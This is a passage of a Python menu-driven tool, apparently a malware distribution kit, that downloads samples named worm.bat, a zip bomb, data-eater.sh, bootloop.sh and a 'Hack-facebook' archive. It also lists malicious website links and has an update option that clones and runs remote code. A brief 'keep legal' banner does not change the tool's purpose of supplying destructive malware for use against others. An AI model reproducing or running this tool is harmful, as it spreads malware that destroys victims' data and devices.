			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'hackfacebook.rar?raw=true' Pdf-autorun-windows/Hack-facebook.rar")
		print(fun)#####done
		print("You may need password for ekstrak \npassword: cracker\n")
	elif menu4 == 3:
		print("\n")
		menu()
	else:
		print("Wrong number")
######################Done pdf
		
#####################start link
def Vpclink():
	print("http://gumblar.cn")
	print("\nhttp://Hurr-Durr.com")
	print("\nhttp://youareaidoit.org")
	print("\nhttp://youareanidiot.org ")
	print("\nhttp://V-I-R-U-S.com")
	print("\nhttp://38zu.cn")
	print("\nCopas link the below")
def Vmacosxlink():
	print("http://bit.ly/2DFak")
	print("\nCopas link the below")
def Vandroidlink():
	print("http://url7.me/NwVk1")
	print("\nCopas link the below")
########################Done link

############Worm and Bomb zip
def Vworm():
	print("[1] Worm.bat")
	print("[2] Bomb.zip")
	print("[3] Back")
	menu5 = input("Choice number > ")
	
	if menu5 == 1:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/worm.bat?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'worm.bat?raw=true' Worm-and-Bombzip/worm.bat")
		print(fun)#####done
	
	elif menu5 == 2:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/bom-zip.zip?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'bom-zip.zip?raw=true' Worm-and-Bombzip/Bomb.zip")
		print(fun)#####done
	
	elif menu5 == 3:
		print("\n")
		menu()
		
	else:
		print("Wrong number")
		
###############Start Shell Virus		
def Shellvirus():
	print("[1] Data-Eater.sh")
	print("[2] Bootloop.sh")
	print("[3] Back")
	
	menu6 = input("Choice number > ")
	if menu6 == 1:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/data-eater.sh?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'data-eater.sh?raw=true' Shell-virus/Data-Eater.sh")
		print(fun)#####done
		
	elif menu6 == 2:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/bootloop.sh?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'bootloop.sh?raw=true' Shell-virus/Bootloop.sh")
		print(fun)#####done
	elif menu6 == 3:
		print("\n")
		menu()
		
	else:
		print("Wrong number")
def menu():
	print(""+G+"Please do"+R+" NOT "+G+"use this tool for illegal activity")
	print(""+R+"[!] "+G+"Keep legal don't illegal "+R+" [!]"+O+"")
	print("\n"+R+"[========== Menu ==========]"+O+"")
	print("[1] Android")
	print("[2] Macosx")
	print("[3] Windows")
	print("[4] Pdf Autorun PC")
	print("[5] Windows [link]")
	print("[6] Macosx  [link]")
	print("[7] Android [link]")
	print("[8] Worm PC and Bomb.zip")
	print("[9] Shell Virus")
	print("[10] Update Tool")
	print("[11] Exit")
	
	menu = input("\nInput Choice Number > ")
	print(""+jarak+"")
	
	if menu == 1:
		Vandroid()
	elif menu == 2:
		Vmacosx()
	elif menu == 3:
		vpcwin()
	elif menu == 4:
		Vpdfautorunpc()
	elif menu == 5:
		Vpclink()
	elif menu == 6:
		Vmacosxlink()
	elif menu == 7:
		Vandroidlink()
	elif menu == 8:
		Vworm()
	elif menu == 9:
		Shellvirus()
	elif menu == 10:
		os.system("rm -rf malicious.py && git clone https://github.com/Hider5/Malicious && python2 malicious.py")
	elif menu == 11:
		fontcolor()
		sys.exit()
	else:
		print("Wrong Choice :(")
	
	
if __name__ == "__main__":

	banner1()
	banner()
	banner2()
	menu()
	fontcolor()
	sys.exit()
		


